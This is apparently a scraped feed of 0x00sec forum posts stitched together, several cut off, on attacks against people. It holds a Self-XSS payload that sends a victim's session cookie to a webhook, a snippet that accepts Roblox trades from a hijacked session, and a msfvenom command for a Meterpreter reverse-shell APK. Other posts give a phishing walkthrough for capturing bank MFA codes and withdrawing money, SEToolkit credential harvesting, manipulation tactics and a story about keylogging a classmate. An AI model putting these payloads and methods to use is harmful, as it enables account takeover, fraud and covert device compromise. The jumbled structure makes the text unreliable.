<a name="introductions-1" class="anchor" href="https://0x00sec.org#introductions-1"></a>Introductions</h1>
<p>Some time ago I came across a popular Roblox scam, a screenshot is shown below:<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png" data-download-href="/uploads/short-url/wjDGRmhr1EJA75OAhq4Cm7AYrvB.png?dl=1" title=":skull:" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_690x195.png" alt=":skull:" data-base62-sha1="wjDGRmhr1EJA75OAhq4Cm7AYrvB" width="690" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_690x195.png, https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/e/2/e27deb982f9f11c9925a08a93625184cd2346313_2_10x10.png"></a></div><br>
This is a popular case of Self-XSS, where a user pretty much compromises themselves. Sadly the rblxapi.pro domain has been burned, so we cannot analyze the payload being run by this little stager. What we <em>can</em> do however is write out own malicious payloads. <img src="https://0x00sec.org/images/emoji/twitter/grimacing.png?v=12" title=":grimacing:" class="emoji" alt=":grimacing:" loading="lazy" width="20" height="20"><p></p>

<p>Self-XSS has the same exact benefits of other XSS vectors such as reflected XSS. These benefits include:</p>
<ul>
<li>
<p>CSRF bypassing</p>
</li>
<li>
<p>Arbitrary code execution</p>
</li>
</ul>
<p>The only issue with Self-XSS is the fact that it is not reliant on a vulnerable webpage, it’s reliant on a vulnerable <em>person</em>.</p>

<p>As we know, nobody is just going to paste <strong>anything</strong> in their terminal or search bar unless they have a reason to. Your payload could pose as an account hijacker, or some free item glitch, etc. It all depends on who you are looking to exploit. The most popular <em>“hack”</em> Self-XSS takes for in is <strong>Account Hijacking</strong>.</p>

<p>As Seen in <a href="https://www.facebook.com/help/246962205475854" rel="noopener nofollow ugc">this Facebook help page</a>, Users run a malicious payload manually thinking it can hijack other accounts. The truth is, they are the ones hijacked.</p>
<h1>
<a name="building-our-own-payloads-4" class="anchor" href="https://0x00sec.org#building-our-own-payloads-4"></a>Building our own payloads</h1>
<p>We will be building a simple Self-XSS payload for the following test application (Written in PHP):</p>
<pre><code class="lang-php">&lt;?php
session_start();
$id = session_id();

echo "&lt;h1&gt;Current Session ID: $id&lt;/h1&gt;";

// run php -S localhost:8080
?&gt;
</code></pre>
<p>Creating 2 different sessions (by opening multiple browser instances, one in incognito and another not), you will get greeted with this:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/c/4/c441db5ae1e5b2da9fc61047c358bb2ea8e31632.png" alt="PHP Session Example" data-base62-sha1="s0aGh6LaY5B6kaZc9sYcXe501wu" width="622" height="261"></p>
<h2>
<a name="exploitation-5" class="anchor" href="https://0x00sec.org#exploitation-5"></a>Exploitation</h2>
<p>We can now create our malicious payload, all we need to do is grab the <code>PHPSESSID</code> cookie from <code>document.cookies</code> and send a fetch request to our exfiltration destination (a Discord webhook, in this case). Payload below:</p>
<pre><code class="lang-javascript">let session = document.cookie.split("; ")[1];

fetch(
 "'WEBHOOK_LINK",
  {
    method: "post",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      username: 'scary 1337 haxor &gt;:)',
      content: "**`" + session + "`**"
    })
  }
);
</code></pre>
<p>Running this is our victims browser, their <code>PHPSESSID</code> will be hooked, and we will now have access to their account.</p>
<h1>
<a name="going-further-6" class="anchor" href="https://0x00sec.org#going-further-6"></a>Going further</h1>
<p>This is already, enough but lets say we want to attack an actual web application <a href="https://roblox.com" rel="noopener nofollow ugc">Roblox</a> for instance. Well, there’s a few flaws in our current payload.</p>
<ul>
<li>The .ROBLOSECURITY cookie is flagged as HTTPOnly</li>
<li>CORS Prevents us from exfiltrating data.</li>
</ul>
<p>What we <em>can</em> do though, is make requests from <code>roblox.com</code> to their APIs, which are hosted on their subdomains. This bypasses the Cross Origin Policy due to the requests coming from <code>roblox.com</code>.</p>
<h2>
<a name="accepting-arbitrary-trades-7" class="anchor" href="https://0x00sec.org#accepting-arbitrary-trades-7"></a>Accepting Arbitrary Trades</h2>
<pre><code class="lang-javascript">let tradeId = "ID";

$.ajax({
  method: "POST",
  url: `https://trades.roblox.com/v1/trades/${tradeId}/accept`,
  contentType: "application/json"
}).then(
  data =&gt; console.log(data)
).fail(
  error =&gt; console.log(error.responseJSON.errors[0].message)
);
</code></pre>
<blockquote>
<p>Running this on an authorized victims account accepts a trade automatically.</p>

          <description><![CDATA[
            <p>From a purely white hat perspective, please. Are there any good guides about how to perform a phishing campaign against a target? What is the best way to learn about this?</p>
<p>I’m particularly interested in spearphishing and whaling. Both the technical aspects (bypassing spam filters, etc) and psychological (getting targets to click the links).</p>
<p>Thanks!</p>

            <p>This is a little less technical but still necessary to understand, as people in cyber. With the US 2020 elections coming up, it’s going to be really interesting monitoring Twitter, 4chan and other feeds for Russian information operations in the coming months.</p>
<p>I’d love to know what you think of this article as I plan to do deep dives into specific info ops campaigns as well. Perhaps starting with QAnon. : )</p>

          <title>Bypassing Multi-factor authentification - How to</title>
          <dc:creator><![CDATA[picco]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>All digital giants and banks are using multi-factor authentification nowadays, to make sure, that the data of the users are “safe”.</p>
<p>(<em><strong>THIS TUTORIAL IS FOR EDUCATIONAL PURPOSES ONLY</strong></em>)</p>
<p>So, <strong>how do i bypass the multi-factor authentification on my targets?</strong></p>
<p>However you created your pishing site, either through tools or self-built, you have to add some other functions to it. It depends on your target.</p>
<p><strong><em>How do i specify, what extra function i need?</em></strong></p>
<p>That’s really straightforward - Just check the 2 factor authentification of the targets site.<br>
(1) <em>All social media sites:</em> PINs<br>
(2) <em>All Banks:</em> TANs</p>
<p>(1) <strong><em>How do i bypass the MFA on social media sites like Youtube, Facebook, Twitter …?</em></strong></p>
<p>Simply add to the standard Login and Password form another one which looks completely the same.<br>
But the new PIN form shows up after they clicked the Login Button.<br>
Immediately after that you receive the Login Data.<br>
You login. Now they get the PIN on their phone. They enter the code in the form. But the form is actually just for show. it does nothing. Just manipulation. They think, the code is for them. Haha. There you go.</p>
<p>(2) <strong><em>How do i bypass the MFA on Banks?</em></strong></p>
<p>It’s literally the same procedure as above. Because banks don’t use usual PINs, they use TANs, which are always attached to a Mobile Banking App.<br>
This App uses a User ID and a Password for the Login. You first have to get those.<br>
So, easily use a User ID and Password Login form. But, there’s something missing, right? Ah yeah, almost forgot it… Just add another TAN form too. Now you got the User ID, Password and TAN form set. But unlike the other method, you immediately show the User ID and Password forms instead of letting them pop up out of nowhere. The TAN form then pops up out of nowhere, which creates the illusion of being real. It isn’t.</p>
<p>You would say now, why do we even include the TAN in this method… The simple answer is: Manipulation.<br>
Every Bank user knows, what a TAN is used for. Mobile Banking. Thats why the thought, which would come up, by seeing that they have to enter the Mobile Banking Data’s is going to vanish, because we include TAN.</p>
<p>Those new 3 added forms use the same code like the Online Banking ID and than the password, which is sent to you automatically. When your target is entering all the 4 forms, you are ready.</p>
<p>Fire up the Mobile Banking App of the specific bank, and enter the gathered data.</p>
<p>Now you can login in the Online Banking and withdraw as much money as you want. Logically, we gathered the MBA details, to receive the TAN we have to verify after every single transaction.</p>
<p>Banks and social media definitly have to step up their game.</p>

          <title>Social Engineering and Phishing with Setoolkit</title>
          <dc:creator><![CDATA[Red_Joker]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>Social Engineering is basically what I believe is the future of hacking. The biggest weakness is people themselves. Why? Imagine that you’ve put in the best security possible cyber wise, but haven’t trained your employees to well, not give out sensitive information even when the request is genuine. Hackers can exploit this weakness very easily if the hacker does it right. Social Engineering I’ve learned is a lot of taking advantage of the trust aspect of the human nature and human idiocity, but people aren’t completely idiots. From my experience, you only ask what you know you would get and make it as innocent as possible or as genuine as possible. In this tutorial, I am gonna explain how to use both SE and Phishing using Setoolkit.</p>
<p>#<span class="hashtag">#Phishing</span> and Social Engineering</p>
<p>What is Phishing? Simply put it, Phishing is most of the time where one sends a fake login page of a legitimate website to gain credentials of the victim. Phishing can be other things, but sadly it is mainly this definition. Social Engineering is needed most of the time to be successful with Phishing. Setoolkit or just simply SET, is a tool that makes certain SE attacks “easier”. There’s many different attacks but for this tutorial we are only gonna focus on Credential Harvesting using a fake login page that we will clone. The Setoolkit can be founded <a href="https://github.com/trustedsec/social-engineer-toolkit" rel="noopener nofollow ugc">here</a> and read the README file in order to know how to install SET onto your system because it is pretty straight forward. Once installed or already installed, in a terminal type in:<br>
<code>sudo setoolkit</code></p>
<p>Agree to the message that first shows up when first launching SET and than a menu is suppose to show up. Your terminal should look a lot like my screenshot,</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/fa72dca7d3dce2fdce18c7bc700f868165d0d64b.png" width="648" height="389"></p>
<p>Type 1, for Social Engineering Attacks. Than another menu should show up,</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/cd6c0939b2521c02c3707228fe60cfcfa59f2c96.png" width="648" height="389"></p>
<p>for that menu type in 2, for Website attack Vectors. Than type in 3, for the Credential Harvester.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0ef30355155d40e53afbee91a3335bb74c5d182e.png" width="648" height="389"></p>
<p>The final menu should show up and type in 2, for Site Cloner.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/bcc39914e3489d651c7e8bfcaba95967a2c98f1b.png" width="574" height="256"></p>
<p>Now, type in your external IP which you can find <a href="https://www.google.com/search?site=&amp;source=hp&amp;q=what+is+my+ip+address&amp;oq=what+is+my+ip+address&amp;gs_l=psy-ab.3...15989.19051.0.19188.21.8.0.0.0.0.1155.1321.0j1j7-1.2.0....0...1.1.64.psy-ab..19.2.1316...0j0i131k1.C3EBLsBagRE" rel="noopener nofollow ugc">here</a>, but make sure you port forward at port 80 for the internal IP that you will use during the attack (your system). To figure out your internal IP, type in ifconfig in a terminal and take note of either wlan0 or whatever your wireless interface maybe. The last and final part before the magic, is the site itself. Type full url of the site that you wish to clone, e.g. facebook. <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> has mentioned that some sites will not work with this method or with anyother method.  Once you hit enter the harvester will begin, but if it ask to stop apache2, type in ‘y’ for the harvester to work.</p>
<p>Simple?</p>
<p>Now the real magic with this is Social Engineering for your victim to click on the link and type in their credentials. This is simpler said than actually done. I usually either use Email or a Text, if I can manage to get their phone number, but you would have to be logical. If you create a Facebook Phishing page, but they don’t have Facebook your Phishing attack will fail. This is where doxing comes in handy, but more on that later.</p>
<p>So that’s that… I gotta say that this is my first time experimenting with screenshots, but please comment down below and offer any suggestions.</p>

          <title>Getting Shell on Android and signing the APK File</title>
          <dc:creator><![CDATA[Red_Joker]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>As <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> insisted that I create a post on how I manually signed a apk file in my <a href="https://0x00sec.org/t/mindless-trolling-with-meterpreter/3107/9">post</a>. As requested, here it is. Although please see this link <a href="http://resources.infosecinstitute.com/lab-hacking-an-android-device-with-msfvenom/#gref" rel="nofollow noopener">here</a> which is the reference that I used for my so called 1337 hax. Before I begin, what you’ll need is:</p>
<ul>
<li>Metasploit</li>
<li>Msfvenom</li>
<li>Payload</li>
<li>keytool</li>
<li>jarsigner</li>
<li>A brain (please)</li>
</ul>
<p><span class="hashtag">#Generating</span> apk file</p>
<p>The first step is of course generating the apk file with meterpreter embedded in the file, of course any payload is usable, but I used the payload; android/meterpreter/reverse_tcp with lport 8080 and my external IP address. The command I used was:<br>
<code>msfvenom -p android/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8080 &gt; z.apk</code></p>
<p>Simple enough?</p>
<p>Of course you could try to just social engineer the apk file as it is, but I found that if you sign the apk file it is more “realistic”, but of course it is your choice.</p>
<p><span class="hashtag">#Signing</span> apk file</p>
<p>There are two tools you’ll need, Keytool and Jarsigner. The first step is generating the keystore. When I did this, I didn’t change much for the command used. Why? It was late and I really didn’t care that much.</p>
<p>Anyways, the command used was:<br>
<code>keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000</code></p>
<p>the command is pretty self explanatory.</p>
<p>Now it is time to sign the apk file using this command:<br>
<code>jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore APPNAME.apk aliasname</code></p>
<p>Again, modify the flags as need be.</p>
<p>Of course, you could just verify the apk file with this command:<br>
<code>jarsigner -verify -verbose -certs APPNAME.apk</code></p>
<p>but I took the risk without checking the apk file because I’m a 1337 haxor.</p>
<p>And that’s it.</p>
<p><span class="hashtag">#Conclusion</span></p>
<p>Of course without having a victim it isn’t fun doing all this sooo hard work. I gotta admit, this is lazy and a skid move, but when it comes to SE, it works almost all the time if you do it right. I do not recommend you to use meterpreter unless you are trolling like I do and this will not work on those that are intelligent enough. I recommend your very own coded reverse shell above all else like these <a href="https://0x00sec.org/t/remote-shells-part-i/269">tut</a> that <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> wrote which helped me out a lot to learn about reverse shells. Thank you!</p>
<p>Anyways, I think that basically wraps everything up at least for now and I hope this does clear up some confusion and some doubts.</p>
<p>Cheers!</p>

            <h1>Human, Hacking the weakest link of an infrastructure</h1>
<p>The web is a new world, reality and internet are two separate things.</p>
<p>On the internet , people feel safe behind their <em>IP address</em> and their <em>computer</em> and thought they have the right to Harass you or hack you without any consequenses.</p>
<p>Internet is a great place. We can share knowledge with other people, learn new skills everyday and more but Internet have a darkside too. We are not talking about <em>Tor</em> or the <em>Darknet/Deepweb</em> here.</p>
<p>Yes.</p>
<p>Those place are known to be place where child pornography, weapon, ID Card are sell but <em>Tor</em> is a great tool for Hackers and people who care about <em>Freedom of speech</em>.</p>
<p>So what will I talk about here ?</p>
<h1>Doxxing 101 : I want to be a Hacker</h1>
<p>In 2015, in France we’ve had the first case of “Swatting” but what is swatting and why is it related to Doxxing ?</p>
<p>Swatting is the “Art” of calling the Swatt and accusing people of fake crime to mess with them, Teenager and jealous people are the one behind those “Attack”. Swatting is used agains <strong>Youtuber</strong>, and <strong>streamer</strong></p>
<p>Swatting is possible because of the information about us on the Web.</p>
<p><em>Facebook</em><br>
<em>Twitter</em><br>
<em>Linkedin</em><br>
<em>snapchat</em><br>
<em>Instagram</em><br>
<em>Blog</em><br>
<em>Github</em></p>
<p>All available source on the web can lead to a Swatting or Harrassment ( e.g : for money ).</p>
<p>Sadly ( or not) , we’re not Transhuman : We can’t install A.V or Malwarebyte on our brain ( maybe in the next few years who know ? )</p>
<p>But we can understand how human works and protect ourself and our data.</p>
<h1>VPN, proxy and Tor : Is it the only thing I need ?</h1>
<p>For some of you, the answer is clear : No.</p>
<p>VPN, Proxy or Tor ( or any hidden net i2p, ect … ) won’t protect you against doxxing and social engineering. We are the weakest link of the chain in an Infrastructure and as soon as we know that, we should pay attention to everything on the web.</p>
<p>VPN, Proxy and tor can hide your ip and hide your location. This is something great ( don’t throw VPN and all other tools they are great tools)</p>
<p>But what if you used your real name on the internet ?<br>
What if your name is linked to some username ?</p>
<p>What can happen ?</p>
<p>Having a username, age, location, ip can lead to identy thief and more so be aware and learn to protect against doxxing</p>
<h1>The first people you should Dox : You</h1>
<p>What, Doxxing yourself what’s the point ?</p>
<p>The point is to see what a Hacker can find about you on the internet. Is your Internet life related too your real life ?</p>
<h2>Google dorks and all search engine are your friends</h2>
<p>Here some tips and tricks for you</p>
<p>The first thing to do is searching your real name on :</p>
<p><em>Google, bing , qwant , duckduckgo</em></p>
<p>everything and see what is related to you if you want to try “dissapear”  of the internet : use everysearch engine and search about your name</p>
<p>For google you can use those famous google dorks :</p>
<p>to search anycontent relate to John doe</p>
<pre><code>intext:"John Doe" 
</code></pre>
<p>Filter the result by extension ( any file about you on the web : pdf , xls  ? )</p>
<pre><code>intext:"John Doe" ext:pdf|xls|docx
</code></pre>
<p>or</p>
<pre><code>intext:"John Doe" filetype:pdf|xls|docx
</code></pre>
<p>If you find a result who lead to your real location : Address of your house, Address of your Parents or familly you need to find a way to erase those informations or erase the content of the search result.</p>
<p>If you don’t mix your real identity with your internet life you’re good against doxxing.</p>
<p>Hope you enjoy this, if you have some tips and tricks you can comment on this post.</p>

          <title>Confundo - abusing Unicode for fun and phishing</title>

            <p>Yo, found this script recently: <a href="https://github.com/Tompazi/confundo" rel="nofollow noopener">https://github.com/Tompazi/confundo</a></p>
<p>What this script does is it replaces letters with similar looking Unicode glyphs. So you feed it a string, and it outputs several strings that look the same, yet use different characters.</p>
<p>An example that comes to mind: If your target is using a chat program that allows Unicode in user names, you might be able to impersonate an admin, some relative or a friend, and try to talk them into giving up info you’re after.</p>

            <p>Hey guys! Check out this awful phishing attempt I received in my email! For OPSEC reasons, I’ve changed any occurrence of my name to “Doe.” Yes, he addressed me by my last name.</p>
<pre><code class="lang-nohighlight">Subject: Dear Doe,

Message:

Dear Doe,
 
I am Barrister Fredrick Adonko, a Legal adviser to my late client
Mr.D.E.Doe,a national of your country who dwelt and worked here for more than twenty years as a businessman and a major contractor to shell petroleum development company. After 

unsuccessful attempts to locate his relatives, I decided to contact you to assist  me and get this huge amount of 
(US$.9.5Million) left over in the Bank here in Lome-Togo, 
for more information reply me.

Thanks.
Barr. Fredrick .Adonko (Esq)

<p>Obviously, as a white-hat community we would <em><strong>never</strong></em> attempt to phish people. However, take a second to enjoy this garbage email.</p>
<p>What are the obvious flaws in this email? Weak grammar and formatting make it obvious that this isn’t a legit email from <em>any</em> respectable law firm. Telling me about a “late” relative I’ve never heard of is also another big no-no.</p>
<p>The “attacker’s” email addresses: <code>fredbuka.lawfirm03@gmail.com</code> and <code>fredrick adonko &lt;fredrickadonkochambers@gmail.com&gt;</code> are similar to blacklisted emails found <a href="http://www.joewein.de/sw/dbl-update/2013-08-28.htm" rel="nofollow noopener">here</a>.</p>

          <title>Core of Human Exploitation: Persuasion</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>Let’s turn this into a series shall we.</p>
<h2>Persuasion</h2>
<p>We want to convince our victim to conduct a certain action. In order to fulfill such tasks, we need to make them feel compelled to do so. How would we go about this without exposing our true intentions?</p>
<p>First, let’s just grasp the true <strong>power</strong> of this skill set, because it’s used more often than the majority of you reading this might think. It can and likely is being used in scenarios where we find ourselves every day. Our school, job, at home with our families, whether we observe and acknowledge this happening, it’s prominent.</p>
<p>You can really turn this into a vicious habit, and use it at places such as your job, where you want to possibly taunt a  co-worker, where you continuously taunt this individual to be humiliated in whatever way that might be. It doesn’t necessarily mean their pants are being pulled down, however this is a professional workplace, and so it’s expected from the employees to act as adults, so it requires little to know misbehaviour to achieve such results.</p>
<hr>
<p>** BACK TO OUR ASSIGNMENT**</p>
<p>We want our victim to conduct a certain action, but how would we go on about this, because we aren’t the master of their mind, and they aren’t puppets. This goes back to the previous post on this particular topic, where I mentioned we need to connect with these people, and establish a personal connection between them.</p>
<p>Analyzing someone’s interests, hobbies, passions, desires etc. is very easy, it requires only for you to talk maybe 5 minutes with that person or less. Once this is done, you thereby have an insight as to what they spend their daily activities with. If you even know this person from say, a previous job or school it increases your knowledge on this person significantly, because you thereby also have a decent overview on part of their personal development.</p>
<hr>
<h2>How to Establish a Personal Connection##</h2>
<p>This personal connetion I keep talking about is fairly simple to achieve, it simply requires a few things. <strong>Confidence, Knowing their interests etc. &amp; manipulation.</strong> Yes, call me cruel, but manipulation can indeed also be used in positive ways. Let me just take a second to explain that manipulation isn’t necessarily just a measure you can take to harm an individual, as we’ve seen numerous times the majority of the times where this specific word comes up, it’s been used in a harmful way.</p>
<hr>
<p><strong>Step 1</strong><br>
Moving on. Now, to break it down bluntly, to create this connection, you need to talk about this person’s interests and endeavors in a way that makes it sound like you actually care about these things, and that you want to achieve something with the purpose of what you’re talking about. You might or might not care about it, it doesnt really matter.</p>
<hr>
<p><strong>Step 2</strong><br>
After this, you thereby incorporate this thing many business corporations have, which is called a <strong>Call to Action.</strong> It’s a simple concept and if you dont already know of this concept, a quick Google search will guide you greatly. With me so far? Okay great.</p>
<hr>
<p>This <strong>Call to Action</strong> has to be used in a specific way however, because it’s very evident and easy to spot this Call to Action when we see it on commercials and now also very frequently on YouTube. Instead, how you should use it in this context, is to indirectly tell them to do something / say something, without actually telling them</p>
<p><strong>"Hey, go tell that person XXXXX".</strong> Instead you could say</p>
<p><strong>"This person did say this about me the other day, it wasnt very nice, it kind made me sad for a while, I don’t know what I should of done. It’s nice that I can talk to this with you about these things, it means a lot."</strong></p>
<p>It’s a very cheesy example, but as long as you get the idea. Using the second example, you not only express and explain <strong>directly</strong> how that particular incident affected you, but you also tell the person <strong>indirectly</strong> that it’d be very nice if someone <strong>had</strong> done something about it at the time of it happening.</p>
<p>After that short dialogue, the person would likely feel compelled in  a way to do something about it, because if you have successfully shown that person that you sincerely care for that person and you aren’t just ‘using’ him/her, the individual will feel as if you have an actual bond, and granted the person has compassion, it would be odd if he/she wouldn’t do anything. (Depending on the fallout)</p>
<p>SIDE NOTE: You could of course also use that exact technique with someone whom you’ve known for a long time, it’s just to put this concept into perspective.</p>
<hr>
<p><strong>Step 3</strong><br>
It really is this simple, once you’ve done these two, the person should feel compelled to act on what you’ve said. And again <strong>please</strong> take note. There are several ‘levels’ of this concept, and it can be used in such a harmful way and in a way blunt way. We’re talking <strong>bullying, social anxiety, manipulation, depression,</strong> all of these can be the result of this technique if you use it correctly.</p>
<hr>
<p><strong>CLOSING</strong></p>
<p>I hope you enjoyed this article, and hope you’ll come back for more when I post a new one.</p>

            <p>A droplet of water shatters like glass upon your nose as the murky sky roars dominantly overhead. You gladly respect the sky gods’ anger and continue picking up your pace since you’ve still a while to go until you’re home.</p>
<p>3:30 PM. Though it took you 20 minutes to jog home from school. Surprisingly, you managed to evade the torrential downpour which unexpectedly started slamming deafeningly against the ceramic tiles on your roof as you hurried to your room. Carelessly dropping your school bag, you hopped onto your chair and woke your computer from sleep. Your heart begins to race. The school bully, Jerry, had almost redecorated your face with the red paint from your nose earlier today because you failed to provide the assignment solutions at the time he requested. In response, you gave him an Oscar-award winning act, begging him not to since you would not be able to deliver it to him from the hospital. You’ve promised to send it to him over the internet some time tonight but you’ve other plans…</p>
<p>You fired up your Microsoft Visual Studio IDE and started to revise the code on which you have been working for the past couple of days. Firstly, the code for the the file binder.</p>

<p>You realize that this method for the stub is not the best since it introduces a lot of forensic evidence and disk activity however, you know that Jerry won’t have a single clue about any of this so you assumed you will be fine and need not to worry.</p>
<p>A test run to confirm that your file binder works is needed for you to be sure that this approach will be successful. Time to launch the Windows command shell.<br>

Your heart starts to beat faster… Successful execution.</p>
<p>Hurriedly, you disable debug mode for your keylogger and rebuild the file… You compress it inside a folder, attach it to an email directed to Jerry… and click to send. As you inhale deeply, questions begin plaguing your mind. What information would I get from his computer? Could I possibly find the password for his Facebook and Gmail? What could I do with such information? The heat of the moment has your brain running overtime as adrenaline floods your body as you decide to get up and shrug off the excitement which has exploded from your actions. A wide grin draws across your face as an ear-splitting blast of thunder explodes in the vicinity, almost as to complement what you have just unleashed…</p>
<p>~  ~  ~</p>
<p>There are no words which can describe your feelings as you approach your computer. It’s been exactly one week since you’ve delivered the silent, vengeful maelstrom upon your foe. Your heart is beating out of your chest. Breathing, quick in succession. You look behind you and see your door is wide open, welcoming any curious eyes to spy on your every actions. Your father is home today. After closing the door, slowly and soundlessly, you reapproach your system. It’s time for harvest…</p>
<p>You log into your FTP account through the FileZilla FTP client as you wonder what you could have retrieved. You browse to your directory which holds the logs from your keylogger and you see the text file waiting for its master. Waiting for you. Hesitantly, you right-click and click <em>View</em>. A Sublime Text window spawns and you see a mass of letters, numbers and strings which correspond to keys on the keyboard such as <code>[ENTER]</code> and <code>[SHIFT]</code>. A beautiful sight before your eyes. As you quickly run your eyes across the screen, you quickly see patterns. There were many <code>w</code>, <code>a</code>, <code>s</code> and <code>d</code> letters, all bunched together like <code>aaaaaaaaaaaaaaaaa</code> and <code>wwwwwwwwwwwwwwwwdddddddwwwwwww</code>. He must be playing some sort of game, you think to yourself. That means he must have needed to log into his account at some point. You check the strings from a previous point and you see it. <code>Birdpers0n</code> and <code>9375chw1f7y</code>. Brilliant. What’s this? A sequence of eighteen followed by a slash and then five numbers and a <code>Rick M. Sanchez</code>? <code>XXXXXXXXXXXXXXXXXX/XXXXX Rick M. Sanchez</code>… <code>XXXX XXXX XXXX XXXX XX/XX XXX Rick M. Sanchez</code>… Droplets of sweat coat your palms and forehead, pupils dilated. Your respiration halts yet a wave of epinephrine overflows your bloodstream. You lean backwards onto your chair to absorb the information you have witnessed. You take a deep breath. What will you do with your discovery?</p>
<hr>
<p>A’ight, so, this thread only covered the social engineering aspect of a hypothetical attack (obviously) which means that the details of the keylogger were missing. Do not worry, I am planning to write up a second part to my Windows Keylogging paper in the future which will cover the details such as FTP uploading keystrokes.</p>
<p>I’ll be uploading the source code to my <a href="https://github.com/93aef0ce4dd141ece6f5/File-Binder">GitHub - File Binder</a> (there are other files which are involved which were not covered) and also the binaries (32-bit, compiled on Windows 7) if you guys want to play around with it. The binder works for any (AFAIK) two files, so that can be like <code>.exe</code> and <code>.jpg</code>, or <code>.jpg</code> and <code>.txt</code> but you might have to run the file binder/stub generator a second time some times if the output happens to fail on the first build.</p>
<p>Hope you guys enjoyed!</p>

          <title>Core of Human Exploitation: How Does it Work?</title>
          <dc:creator><![CDATA[Merozey]]></dc:creator>
          <category>Social Engineering</category>
          <description><![CDATA[
            <p>Hi, i’ll delve right into this topic and hope it’ll make up for my absence recently, but I have a lot on my plate. I’ll bring up a topic of mine which you know is dear to me. <strong>Social-engineering.</strong></p>
<p>**</p>
<h2>Overview</h2>
<p>**</p>
<p>I’ve seen people online saying social-engineering is something you become, and that you can become an actual social-engineer. As true as that is to an extent, I wouldn’t necessarily say it’s something you become, because if you ask me, i’ll tell you right now that many people already possess this set of skills, they just don’t know of it’s presence, because they dont see it as an exploitation method.</p>
<p>Because, in our daily lives, there are things we don’t want to do (no surprise) and we want a way out of it. It could be anything as an extra shift, a boring dinner, a reunion perahps and so on. So how would one refrain from attending these events? A 'im sick I cant come… sorry* or, “My friend is going into labour” A little over the top, but you know whatever works.</p>
<p>Those are already perfect examples of social-engineering. People realize that in order to achieve their desired result, they need to figure out what the person they need to persuade is ‘vulnerable’ to. (To put it bluntly). I mean, if you texted your friend, “Hey I dont want to go to this boring wedding or dinner, you can just go alone” He would probably respond back with agitation.</p>
<p>So we avoid that with an excuse. This is where I think social-engineering becomes very relevant and interesting, because we as humans realize that people are vulnerable to certain things and topics, and we therefore use those to skip unwanted events.</p>
<p>**</p>
<h2>Analyzing your ‘target’</h2>
<p>**</p>
<p>When we want to obtain credentials from our target, we need to persuade them. And what do we need to establish in order to persuade them? Trust. This is the core of exploiting people using social-engineering. Social-engineering is built upon human interaction, and that relies upon trust because people wont believe what you tell them if they dont have a certain amount of trust to you.</p>
<p>Call me crazy, but I think it is very important to know your victim when exploiting them. Knowing their values, morals, what they like and dont like in terms of food, sports, tv shows, literally everything. The more you know all of these things, you literally have an insight to their entire life. Thereby being able to know exactly what to say, in what context to say, and maybe even saying it in a certain way to convey your message stronger.</p>
<p>I hope you can follow along, because its very fascinating.</p>
<p>**</p>
<h2>Persuasion</h2>
<p>**</p>
<p>This concept of human exploitation really comes down to how we as humans are thinking and perceive things. Imagine if humans weren’t easily fooled. A good example of that would be <strong>magic</strong>. A magicians mission is to make you believe something, and he/she does that by showing your eyes one thing, when in reality the trick is going on elsewhere.</p>
<p>Imagine if we as humans needed further proof to these magic tricks. I mean, we all know it’s a hoax, but yet we leave these shows feeling convinced in a way, because we saw it with our own eyes right in front of us, heck yo might even have been up there to help with the trick.</p>
<p>**</p>
<h2>End point</h2>
<p>**</p>
<p>So, in order to exploit your victim, you should know literally as much about them as possible. What hobbies they have, sports preferences, favourite tv shows. All of these factors are things you can use in your convincing argument, and with the right context and use of words you’ll seem convincing.</p>
<p>It’s really a big topic, and i’ll definitely be doing more articles on this topic. For the upcoming articles i’ll be jumping to some anonymity, one of my also dear topics.</p>

<p><em>A fictional tutorial about social engineering, recon, exploitation, and a complete lack of ethics. By <a class="mention" href="https://0x00sec.org/u/ninja243">@Ninja243</a></em></p>
<hr>
<p>It’s a cold, dark night in your room. You know you shouldn’t be up this late, but you are, yet again. To pass time, and to wait for the erratic buzz of caffeine to wear off, you unlock your phone and open <a href="https://www.kik.com/" rel="nofollow noopener">Kik</a> (or some unofficial client) to see what’s new:</p>
<p>The messages start flowing in.</p>
<p>Of the three hundred <a href="http://mweya.ddns.net/Temp/PowerCode" rel="nofollow noopener">lag messages</a> from groups owned by the self-titled <a href="http://kik.me/6so" rel="nofollow noopener">Kik God</a> and his henchmen, one stood out: it was a message from an <a href="http://kik.me/MweyaR" rel="nofollow noopener">old friend</a>, with whom you lost contact ages ago.</p>
<p>“I wonder what he wants,” you silently muse.</p>
<p>You read the message and his motives become clearer. One of your mutual friends seems to have been harassed yet again by one of the “<a href="http://kik.me/6so" rel="nofollow noopener">Gods</a>”, but – this time –  one user went overboard and started issuing death threats.</p>
